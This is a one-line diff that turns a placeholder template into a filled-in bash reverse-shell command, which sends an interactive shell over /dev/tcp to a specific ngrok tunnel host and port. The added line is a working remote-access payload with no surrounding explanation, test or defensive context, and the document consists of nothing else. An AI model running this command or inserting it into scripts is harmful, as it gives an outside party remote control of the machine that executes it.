@@ -1,1 +1,1 @@
-sh -i >& /dev/tcp/( raw ).tcp.eu.ngrok.io/( porta ) 0>&1; exec bash
+sh -i >& /dev/tcp/2.tcp.eu.ngrok.io/13181 0>&1; exec bash
